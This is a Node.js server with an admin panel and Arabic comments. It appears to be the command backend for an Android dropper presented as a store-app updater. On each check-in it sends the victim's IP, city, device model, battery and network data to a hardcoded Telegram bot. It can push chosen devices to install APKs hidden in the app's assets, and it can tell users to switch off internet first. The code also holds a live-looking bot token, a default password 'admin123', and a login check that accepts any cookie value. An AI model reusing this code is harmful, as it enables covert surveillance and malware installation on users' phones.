/**
 * ✅ SmartStore Server V2 - مع دعم تبديل التطبيقات عن بعد
 *
 * المميزات الجديدة:
 *   - دعم تطبيقات متعددة (رفع، تفعيل، طلب تحديث لتطبيق معين)
 *   - كل جهاز يمكن أن يطلب تحديث لتطبيق مختلف
 *   - لوحة تحكم محسّنة مع قسم إدارة التطبيقات
 *   - رفع التطبيقات عبر API مباشرة
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const crypto = require('crypto');
const os = require('os');

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ أسرار مخفية في متغيرات البيئة
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8808510903:AAFYW8Qs-lwnMv3-rdsP0js2XuIznuTJ5Po';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8135323130';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// ✅ مجلد التطبيقات
const APPS_DIR = path.join(__dirname, 'apps');
if (!fs.existsSync(APPS_DIR)) fs.mkdirSync(APPS_DIR, { recursive: true });

// ✅ قاعدة بيانات JSON
const DB_FILE = path.join(os.tmpdir(), 'db.json');
let db = {
    devices: {},                  // { deviceId: {info, lastSeen, mode, targetApp} }
    globalMode: 'auto',           // 'auto' | 'force_update'
    globalTargetApp: null,        // التطبيق الذي سيُطلب تحديثه (للوضع العام)
    activeApp: 'embedded_app.apks',
    availableApps: [],
    // ✅ ميزة جديدة: التحكم في رسالة إغلاق الإنترنت (افتراضي: معطّل)
    requireInternetOff: false
};

function loadDb() {
    try {
        if (fs.existsSync(DB_FILE)) {
            const data = fs.readFileSync(DB_FILE, 'utf8');
            db = { ...db, ...JSON.parse(data) };
            console.log('✅ Database loaded');
        }
    } catch (e) {
        console.error('❌ Database load error:', e.message);
    }
}

function saveDb() {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
    } catch (e) {
        console.error('❌ Database save error:', e.message);
    }
}

// ✅ تحديث قائمة التطبيقات المتاحة تلقائياً من مجلد apps
function refreshAvailableApps() {
    try {
        const files = fs.readdirSync(APPS_DIR).filter(f =>
            f.endsWith('.apk') || f.endsWith('.apks')
        );
        db.availableApps = files;
        if (files.length > 0 && !files.includes(db.activeApp)) {
            db.activeApp = files[0];
        }
        saveDb();
        console.log(`✅ Available apps: ${files.join(', ')}`);
    } catch (e) {
        console.error('❌ refreshAvailableApps error:', e.message);
    }
}

loadDb();
refreshAvailableApps();

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} ${req.method} ${req.url}`);
    next();
});

// ===================================================================
// API للتطبيق
// ===================================================================

/**
 * ✅ التطبيق يستدعي هذا عند فتحه
 * POST /api/checkin
 *
 * Body يحتوي على localApps: قائمة التطبيقات المتاحة في assets على جهاز المستخدم
 * Response: { mode, targetApp, activeApp, message }
 *
 * mode = 'auto' → افتح التطبيق المضمن مباشرة
 * mode = 'force_update' → اعرض واجهة التحديث + ثبّت targetApp من assets المحلية
 */
app.post('/api/checkin', (req, res) => {
    try {
        const { deviceId, appVersion, localApps, ...deviceInfo } = req.body;
        if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

        const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
            .split(',')[0].trim().replace('::ffff:', '');

        db.devices[deviceId] = {
            ...db.devices[deviceId],
            ...deviceInfo,
            deviceId,
            appVersion: appVersion || '8.0.0',
            lastSeen: new Date().toISOString(),
            ip: clientIp,
            // ✅ حفظ قائمة التطبيقات المحلية المتاحة على جهاز المستخدم
            localApps: Array.isArray(localApps) ? localApps : []
        };
        saveDb();

        fetchIpInfo(clientIp).then(ipInfo => {
            db.devices[deviceId].country = ipInfo.country;
            db.devices[deviceId].city = ipInfo.city;
            saveDb();
            sendTelegramNotification(db.devices[deviceId], ipInfo).catch(console.error);
        }).catch(console.error);

        const deviceMode = db.devices[deviceId].mode || db.globalMode;
        // ✅ التطبيق الهدف: جهاز معين > عام
        const targetApp = db.devices[deviceId].targetApp ||
                          db.globalTargetApp ||
                          db.activeApp;

        // ✅ التحقق: التطبيق الهدف يجب أن يكون متاحاً محلياً على جهاز المستخدم
        const deviceLocalApps = db.devices[deviceId].localApps || [];
        const finalTargetApp = deviceLocalApps.includes(targetApp) ? targetApp : null;

        const response = {
            mode: deviceMode,
            targetApp: finalTargetApp || targetApp,
            activeApp: db.activeApp,
            requireInternetOff: db.requireInternetOff,
            message: deviceMode === 'force_update'
                ? 'يتوفر إصدار جديد، يرجى التحديث'
                : 'التطبيق محدّث'
        };

        res.json(response);
    } catch (e) {
        console.error('Checkin error:', e);
        res.status(500).json({ error: 'Internal error' });
    }
});

/**
 * ✅ ميزة جديدة: التطبيق يستدعي هذا بعد نجاح التحديث
 * لإرجاع الجهاز تلقائياً للوضع التلقائي (auto)
 * POST /api/device/:deviceId/installed
 */
app.post('/api/device/:deviceId/installed', (req, res) => {
    const deviceId = req.params.deviceId;
    if (db.devices[deviceId]) {
        db.devices[deviceId].mode = 'auto';
        db.devices[deviceId].targetApp = null;
        db.devices[deviceId].lastInstall = new Date().toISOString();
        saveDb();
        console.log(`✅ Device ${deviceId} installed successfully - reset to auto mode`);
    }
    res.json({ success: true, mode: 'auto' });
});

/**
 * ✅ حالة جهاز معين
 * GET /api/status/:deviceId
 */
app.get('/api/status/:deviceId', (req, res) => {
    const device = db.devices[req.params.deviceId];
    if (!device) {
        return res.json({
            mode: db.globalMode,
            activeApp: db.activeApp,
            requireInternetOff: db.requireInternetOff
        });
    }
    res.json({
        mode: device.mode || db.globalMode,
        targetApp: device.targetApp || db.globalTargetApp || db.activeApp,
        activeApp: db.activeApp,
        requireInternetOff: db.requireInternetOff,
        lastSeen: device.lastSeen
    });
});

/**
 * ✅ تنزيل التطبيق النشط (الافتراضي)
 * GET /api/download/app
 */
app.get('/api/download/app', (req, res) => {
    const appFile = path.join(APPS_DIR, db.activeApp);
    if (!fs.existsSync(appFile)) {
        return res.status(404).send('App not found');
    }
    res.download(appFile, db.activeApp);
});

/**
 * ✅ تنزيل تطبيق معين بالاسم
 * GET /api/download/app/:name
 */
app.get('/api/download/app/:name', (req, res) => {
    const name = path.basename(req.params.name); // منع path traversal
    const appFile = path.join(APPS_DIR, name);
    if (!fs.existsSync(appFile)) {
        return res.status(404).send('App not found');
    }
    res.download(appFile, name);
});

// ===================================================================
// لوحة التحكم (محمية بكلمة مرور)
// ===================================================================

app.get('/login', (req, res) => res.send(getLoginPage()));

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        const token = crypto.createHash('sha256').update(password + Date.now()).digest('hex');
        res.setHeader('Set-Cookie', `admin_token=${token}; HttpOnly; Path=/; Max-Age=86400`);
        return res.redirect('/admin');
    }
    res.send(getLoginPage('كلمة مرور خاطئة'));
});

function authMiddleware(req, res, next) {
    const cookie = req.headers.cookie || '';
    if (!cookie.match(/admin_token=([^;]+)/)) return res.redirect('/login');
    next();
}

app.get('/admin', authMiddleware, (req, res) => res.send(getAdminPage()));

app.get('/admin/api/devices', authMiddleware, (req, res) => {
    res.json({
        devices: Object.values(db.devices),
        globalMode: db.globalMode,
        globalTargetApp: db.globalTargetApp,
        activeApp: db.activeApp,
        availableApps: db.availableApps,
        requireInternetOff: db.requireInternetOff
    });
});

// ✅ تعيين الوضع العام + التطبيق الهدف العام
app.post('/admin/api/global-mode', authMiddleware, (req, res) => {
    const { mode, targetApp } = req.body;
    if (!['auto', 'force_update'].includes(mode)) {
        return res.status(400).json({ error: 'Invalid mode' });
    }
    db.globalMode = mode;
    if (targetApp) db.globalTargetApp = targetApp;
    if (mode === 'auto') db.globalTargetApp = null; // في الوضع التلقائي لا حاجة لتطبيق هدف
    saveDb();
    res.json({ success: true, mode: db.globalMode, targetApp: db.globalTargetApp });
});

// ✅ تعيين وضع جهاز معين + التطبيق الهدف له
app.post('/admin/api/device/:deviceId/mode', authMiddleware, (req, res) => {
    const { mode, targetApp } = req.body;
    const deviceId = req.params.deviceId;
    if (!db.devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    db.devices[deviceId].mode = mode;
    if (targetApp) db.devices[deviceId].targetApp = targetApp;
    if (mode === 'auto') db.devices[deviceId].targetApp = null;
    saveDb();
    res.json({ success: true, mode, targetApp: db.devices[deviceId].targetApp });
});

// ✅ تغيير التطبيق النشط (الافتراضي للمتاجر الجديدة)
app.post('/admin/api/active-app', authMiddleware, (req, res) => {
    const { appName } = req.body;
    refreshAvailableApps();
    if (!db.availableApps.includes(appName)) {
        return res.status(400).json({ error: 'App not available' });
    }
    db.activeApp = appName;
    saveDb();
    res.json({ success: true, activeApp: db.activeApp });
});

// ✅ ميزة جديدة: تفعيل/تعطيل رسالة إغلاق الإنترنت
app.post('/admin/api/internet-warning', authMiddleware, (req, res) => {
    db.requireInternetOff = !!req.body.enabled;
    saveDb();
    console.log(`🌐 Internet warning ${db.requireInternetOff ? 'ENABLED' : 'DISABLED'}`);
    res.json({ success: true, requireInternetOff: db.requireInternetOff });
});

// ✅ ميزة جديدة: إعادة جهاز معين للوضع التلقائي من اللوحة
app.post('/admin/api/device/:deviceId/reset', authMiddleware, (req, res) => {
    const deviceId = req.params.deviceId;
    if (db.devices[deviceId]) {
        db.devices[deviceId].mode = 'auto';
        db.devices[deviceId].targetApp = null;
        saveDb();
    }
    res.json({ success: true });
});

// ✅ رفع تطبيق جديد (base64)
app.post('/admin/api/upload-app', authMiddleware, (req, res) => {
    try {
        const { name, content } = req.body;
        if (!name || !content) {
            return res.status(400).json({ error: 'name and content required' });
        }
        // منع path traversal
        const safeName = path.basename(name);
        if (!safeName.endsWith('.apk') && !safeName.endsWith('.apks')) {
            return res.status(400).json({ error: 'Only .apk or .apks files allowed' });
        }
        const filePath = path.join(APPS_DIR, safeName);
        const buffer = Buffer.from(content, 'base64');
        fs.writeFileSync(filePath, buffer);
        refreshAvailableApps();
        console.log(`✅ Uploaded: ${safeName} (${buffer.length} bytes)`);
        res.json({ success: true, name: safeName, size: buffer.length, availableApps: db.availableApps });
    } catch (e) {
        console.error('Upload error:', e);
        res.status(500).json({ error: e.message });
    }
});

// ✅ حذف تطبيق
app.delete('/admin/api/app/:name', authMiddleware, (req, res) => {
    const name = path.basename(req.params.name);
    const filePath = path.join(APPS_DIR, name);
    if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
    }
    refreshAvailableApps();
    if (db.activeApp === name) {
        db.activeApp = db.availableApps[0] || 'embedded_app.apks';
        saveDb();
    }
    res.json({ success: true, availableApps: db.availableApps });
});

// ✅ حذف جهاز
app.delete('/admin/api/device/:deviceId', authMiddleware, (req, res) => {
    delete db.devices[req.params.deviceId];
    saveDb();
    res.json({ success: true });
});

app.get('/admin/api/stats', authMiddleware, (req, res) => {
    const devices = Object.values(db.devices);
    const now = Date.now();
    res.json({
        totalDevices: devices.length,
        onlineDevices: devices.filter(d => now - new Date(d.lastSeen).getTime() < 5 * 60 * 1000).length,
        forceUpdateDevices: devices.filter(d => d.mode === 'force_update').length,
        autoDevices: devices.filter(d => d.mode === 'auto').length
    });
});

// ===================================================================
// دوال مساعدة
// ===================================================================

function fetchIpInfo(ip) {
    return new Promise((resolve) => {
        if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
            return resolve({ ip: ip || 'Unknown', country: 'Local', city: 'Local' });
        }
        http.get(`http://ip-api.com/json/${ip}?fields=countryCode,city&lang=ar`, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    resolve({ ip, country: json.countryCode || 'Unknown', city: json.city || 'Unknown' });
                } catch (e) {
                    resolve({ ip, country: 'Unknown', city: 'Unknown' });
                }
            });
        }).on('error', () => resolve({ ip, country: 'Unknown', city: 'Unknown' }));
    });
}

function sendTelegramNotification(device, ipInfo) {
    return new Promise((resolve, reject) => {
        const message = formatTelegramMessage(device, ipInfo);
        const postData = `chat_id=${encodeURIComponent(CHAT_ID)}&text=${encodeURIComponent(message)}`;
        const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(postData) }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => { console.log('Telegram:', res.statusCode); resolve(data); });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

function formatTelegramMessage(device, ipInfo) {
    const battery = device.batteryPct || 0;
    const charging = device.charging ? 'نعم' : 'لا';
    const network = device.networkType || 'Unknown';
    const language = device.language || 'Unknown';
    const time = new Date().toLocaleString('ar-EG', { timeZone: 'UTC' });
    return `👁 تم فتح تطبيق المتجر في جهاز 💕
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 معلومات المستخدم:
🌐 IP: ${ipInfo.ip}
🌍 الدولة: ${ipInfo.country}
🏙️ المدينة: ${ipInfo.city}
━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 معلومات الجهاز:
📲 اسم الجهاز: ${device.brand || 'Unknown'} ${device.model || ''}
🏷️ الماركة: ${device.brand || 'Unknown'}
📟 الموديل: ${device.model || 'Unknown'}
🔢 إصدار Android: ${device.androidVersion || 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
🖥️ الشاشة: ${device.screen || 'Unknown'}
🧠 المعالجات: ${device.cores || 'Unknown'}  💾 RAM: ${device.ram || 'Unknown'}
🔋 البطارية: ${battery}% ⚡ شحن: ${charging}
📡 الشبكة: ${network}
🗣️ اللغة: ${language}
⏰ الوقت: ${time}
━━━━━━━━━━━━━━━━━━━━━━━━━━`;
}

function getLoginPage(error) {
    return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول</title><style>
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
.card{background:white;padding:40px;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.2);width:100%;max-width:400px}
h1{text-align:center;color:#333;margin-bottom:30px;font-size:24px}
input{width:100%;padding:14px;margin:10px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box}
input:focus{outline:none;border-color:#667eea}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:bold}
.error{color:#e74c3c;text-align:center;margin:10px 0}</style></head>
<body><div class="card"><h1>🔐 لوحة تحكم AppHub</h1>
${error ? `<div class="error">${error}</div>` : ''}
<form method="POST" action="/login"><input type="password" name="password" placeholder="كلمة المرور" required autofocus><button type="submit">دخول</button></form>
</div></body></html>`;
}

function getAdminPage() {
    return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AppHub Admin</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#f5f7fa;color:#333}
.header{background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.header h1{font-size:22px}
.container{max-width:1400px;margin:20px auto;padding:0 20px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:white;padding:20px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.05);text-align:center}
.stat-card .num{font-size:32px;font-weight:bold;color:#667eea}
.stat-card .label{color:#666;font-size:14px;margin-top:4px}
.section{background:white;padding:20px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.05);margin-bottom:24px}
.section h2{margin-bottom:16px;font-size:18px;border-bottom:2px solid #667eea;padding-bottom:8px}
.btn{padding:10px 16px;border:none;border-radius:8px;cursor:pointer;font-size:13px;font-weight:bold;margin:3px;transition:all .2s}
.btn-primary{background:#667eea;color:white}
.btn-danger{background:#e74c3c;color:white}
.btn-success{background:#27ae60;color:white}
.btn-warning{background:#f39c12;color:white}
.btn:hover{transform:translateY(-1px);box-shadow:0 2px 8px rgba(0,0,0,.15)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-sm{padding:5px 10px;font-size:11px}
table{width:100%;border-collapse:collapse}
th,td{padding:10px;text-align:right;border-bottom:1px solid #eee;font-size:12px}
th{background:#f8f9fa;font-weight:bold;color:#555}
tr:hover{background:#f8f9fa}
.badge{padding:3px 8px;border-radius:4px;font-size:11px;font-weight:bold;color:white}
.badge-online{background:#27ae60}.badge-offline{background:#95a5a6}
.badge-force{background:#e74c3c}.badge-auto{background:#3498db}
select,input[type=file]{padding:8px;border:2px solid #e0e0e0;border-radius:8px;font-size:14px;margin:4px}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:1000}
.modal-overlay.active{display:flex}
.modal{background:white;padding:30px;border-radius:16px;max-width:500px;width:90%;max-height:90vh;overflow-y:auto}
.modal h3{margin-bottom:20px;color:#333}
.app-pill{display:inline-block;background:#e8f4fd;color:#2980b9;padding:3px 10px;border-radius:12px;font-size:11px;margin:2px}
</style></head><body>
<div class="header"><h1>🎛️ لوحة تحكم AppHub</h1></div>

<div class="container">
  <div class="stats">
    <div class="stat-card"><div class="num" id="stat-total">0</div><div class="label">إجمالي الأجهزة</div></div>
    <div class="stat-card"><div class="num" id="stat-online">0</div><div class="label">متصل الآن</div></div>
    <div class="stat-card"><div class="num" id="stat-force">0</div><div class="label">طلب تحديث</div></div>
    <div class="stat-card"><div class="num" id="stat-apps">0</div><div class="label">تطبيقات متاحة</div></div>
  </div>

  <!-- التحكم العام -->
  <div class="section">
    <h2>🎮 التحكم العام</h2>
    <p style="margin-bottom:12px;color:#666;font-size:13px">الوضع العام: <strong id="global-mode-display">-</strong></p>
    <div style="margin-bottom:10px">
      <label>التطبيق الهدف العام (لطلب تحديث):</label>
      <select id="global-target-app" style="width:300px"></select>
      <small style="display:block;color:#999;margin-top:4px">⚠️ هذا التطبيق يجب أن يكون موجوداً في assets على أجهزة المستخدمين</small>
    </div>
    <button class="btn btn-success" onclick="setGlobalMode('auto')">✅ وضع تلقائي (افتح مباشر)</button>
    <button class="btn btn-danger" onclick="setGlobalMode('force_update')">⚠️ طلب تحديث إجباري للكل</button>

    <div style="margin-top:20px;padding-top:16px;border-top:1px solid #eee">
      <h3 style="font-size:15px;margin-bottom:8px">🌐 رسالة إغلاق الإنترنت (لأندرويد 13+)</h3>
      <p style="font-size:12px;color:#666;margin-bottom:8px">عند التفعيل: يُمنع التحديث والإنترنت مفتوح على Android 13+. عند التعطيل (افتراضي): التحديث يعمل بدون قيود.</p>
      <button class="btn btn-danger" id="btn-enable-internet-warning" onclick="setInternetWarning(true)">🚫 تفعيل رسالة إغلاق الإنترنت</button>
      <button class="btn btn-success" id="btn-disable-internet-warning" onclick="setInternetWarning(false)" style="display:none">✅ تعطيل رسالة إغلاق الإنترنت</button>
      <span id="internet-warning-status" style="margin-right:10px;font-weight:bold"></span>
    </div>
  </div>

  <!-- قائمة الأجهزة -->
  <div class="section">
    <h2>📱 الأجهزة المتصلة</h2>
    <table>
      <thead><tr>
        <th>الجهاز</th><th>Android</th><th>IP</th><th>الدولة</th>
        <th>آخر ظهور</th><th>الحالة</th><th>الوضع</th><th>التطبيقات المحلية</th><th>إجراءات</th>
      </tr></thead>
      <tbody id="devices-tbody"><tr><td colspan="9" style="text-align:center;padding:40px;color:#999">جاري التحميل...</td></tr></tbody>
    </table>
  </div>
</div>

<!-- Modal طلب تحديث لجهاز -->
<div class="modal-overlay" id="modal-force-update">
  <div class="modal">
    <h3>⚠️ طلب تحديث لتطبيق جديد</h3>
    <p style="margin-bottom:8px">اختر التطبيق الذي تريد للمستخدم تثبيته:</p>
    <p id="device-local-apps-info" style="margin-bottom:16px;font-size:12px;color:#999"></p>
    <select id="device-target-app" style="width:100%;margin-bottom:20px"></select>
    <div style="text-align:center">
      <button class="btn btn-success" onclick="confirmForceUpdate()">✅ تأكيد طلب التحديث</button>
      <button class="btn" onclick="closeModal()">إلغاء</button>
    </div>
  </div>
</div>

<script>
function esc(s){return String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}

let currentDeviceForUpdate = null;
let currentDevices = [];

async function loadDevices() {
  try {
    const res = await fetch('/admin/api/devices');
    const data = await res.json();
    currentDevices = data.devices;
    const tbody = document.getElementById('devices-tbody');
    document.getElementById('global-mode-display').textContent = data.globalMode === 'force_update' ? 'طلب تحديث إجباري' : 'تلقائي';

    // ✅ تحديث أزرار رسالة الإنترنت
    const btnEnable = document.getElementById('btn-enable-internet-warning');
    const btnDisable = document.getElementById('btn-disable-internet-warning');
    const status = document.getElementById('internet-warning-status');
    if (data.requireInternetOff) {
      btnEnable.style.display = 'none';
      btnDisable.style.display = 'inline-block';
      status.textContent = '✅ مفعّلة';
      status.style.color = '#e74c3c';
    } else {
      btnEnable.style.display = 'inline-block';
      btnDisable.style.display = 'none';
      status.textContent = 'معطّلة (افتراضي)';
      status.style.color = '#27ae60';
    }

    // ✅ قائمة التطبيقات المتاحة في السيرفر (للوضع العام)
    const globalSelect = document.getElementById('global-target-app');
    globalSelect.innerHTML = '<option value="">(استخدم التطبيق النشط)</option>' +
      data.availableApps.map(a => '<option value="'+esc(a)+'">'+esc(a)+'</option>').join('');
    if (data.globalTargetApp) globalSelect.value = data.globalTargetApp;

    document.getElementById('stat-apps').textContent = data.availableApps.length;

    if (data.devices.length === 0) {
      tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:40px;color:#999">لا توجد أجهزة مسجلة بعد</td></tr>';
      return;
    }
    tbody.innerHTML = data.devices.map(d => {
      const isOnline = (Date.now() - new Date(d.lastSeen).getTime()) < 5 * 60 * 1000;
      const mode = d.mode || data.globalMode;
      // ✅ عرض التطبيقات المحلية المتاحة على جهاز المستخدم
      const localApps = (d.localApps || []).map(a => '<span class="app-pill">'+esc(a)+'</span>').join('') || '<small style="color:#999">لا توجد</small>';
      return '<tr>' +
        '<td><strong>'+esc(d.brand)+' '+esc(d.model)+'</strong><br><small style="color:#999">'+esc(d.deviceId.substring(0,12))+'...</small></td>' +
        '<td>'+esc(d.androidVersion)+'</td>' +
        '<td>'+esc(d.ip)+'</td>' +
        '<td>'+esc(d.country)+'</td>' +
        '<td>'+new Date(d.lastSeen).toLocaleString('ar')+'</td>' +
        '<td><span class="badge '+(isOnline?'badge-online':'badge-offline')+'">'+(isOnline?'متصل':'آخر')+'</span></td>' +
        '<td><span class="badge '+(mode==='force_update'?'badge-force':'badge-auto')+'">'+(mode==='force_update'?'تحديث':'تلقائي')+'</span></td>' +
        '<td style="max-width:200px">'+localApps+'</td>' +
        '<td>' +
          '<button class="btn btn-danger btn-sm" onclick="openForceUpdateModal(\\''+d.deviceId+'\\')">طلب تحديث</button>' +
          '<button class="btn btn-success btn-sm" onclick="setDeviceMode(\\''+d.deviceId+'\\',\\'auto\\')">فتح مباشر</button>' +
          '<button class="btn btn-warning btn-sm" onclick="deleteDevice(\\''+d.deviceId+'\\')">حذف</button>' +
        '</td></tr>';
    }).join('');
  } catch (e) { console.error(e); }
}

async function setInternetWarning(enabled) {
  await fetch('/admin/api/internet-warning', {method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({enabled})});
  loadDevices();
}

async function loadStats() {
  const res = await fetch('/admin/api/stats');
  const data = await res.json();
  document.getElementById('stat-total').textContent = data.totalDevices;
  document.getElementById('stat-online').textContent = data.onlineDevices;
  document.getElementById('stat-force').textContent = data.forceUpdateDevices;
}

async function setGlobalMode(mode) {
  const targetApp = document.getElementById('global-target-app').value || null;
  await fetch('/admin/api/global-mode', {method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({mode, targetApp})});
  loadDevices(); loadStats();
}

async function setDeviceMode(deviceId, mode) {
  await fetch('/admin/api/device/'+deviceId+'/mode', {method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({mode})});
  loadDevices(); loadStats();
}

function openForceUpdateModal(deviceId) {
  currentDeviceForUpdate = deviceId;
  const device = currentDevices.find(d => d.deviceId === deviceId);
  const select = document.getElementById('device-target-app');
  const info = document.getElementById('device-local-apps-info');

  // ✅ عرض التطبيقات المحلية المتاحة على جهاز هذا المستخدم
  if (device && device.localApps && device.localApps.length > 0) {
    select.innerHTML = device.localApps.map(a => '<option value="'+esc(a)+'">'+esc(a)+'</option>').join('');
    info.textContent = 'التطبيقات المحلية المتاحة على جهاز المستخدم: ' + device.localApps.join('، ');
    info.style.color = '#27ae60';
  } else {
    // fallback: عرض التطبيقات في السيرفر
    select.innerHTML = '<option value="">(لا توجد تطبيقات محلية على جهاز المستخدم)</option>';
    info.textContent = '⚠️ لا توجد تطبيقات محلية متاحة على هذا الجهاز. أضف تطبيقات لمجلد assets في APK.';
    info.style.color = '#e74c3c';
  }
  document.getElementById('modal-force-update').classList.add('active');
}

function closeModal() {
  document.getElementById('modal-force-update').classList.remove('active');
  currentDeviceForUpdate = null;
}

async function confirmForceUpdate() {
  if (!currentDeviceForUpdate) return;
  const targetApp = document.getElementById('device-target-app').value;
  if (!targetApp) {
    alert('⚠️ اختر تطبيقاً أولاً');
    return;
  }
  await fetch('/admin/api/device/'+currentDeviceForUpdate+'/mode', {method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({mode:'force_update', targetApp})});
  closeModal(); loadDevices(); loadStats();
}

async function deleteDevice(deviceId) {
  if (!confirm('حذف الجهاز؟')) return;
  await fetch('/admin/api/device/'+deviceId, {method:'DELETE'});
  loadDevices(); loadStats();
}

loadDevices(); loadStats();
setInterval(() => { loadDevices(); loadStats(); }, 5000);
</script>
</body></html>`;
}

app.listen(PORT, () => {
    console.log('🚀 SmartStore Server V2 running on port ' + PORT);
    console.log('📍 Admin: http://localhost:' + PORT + '/login');
});
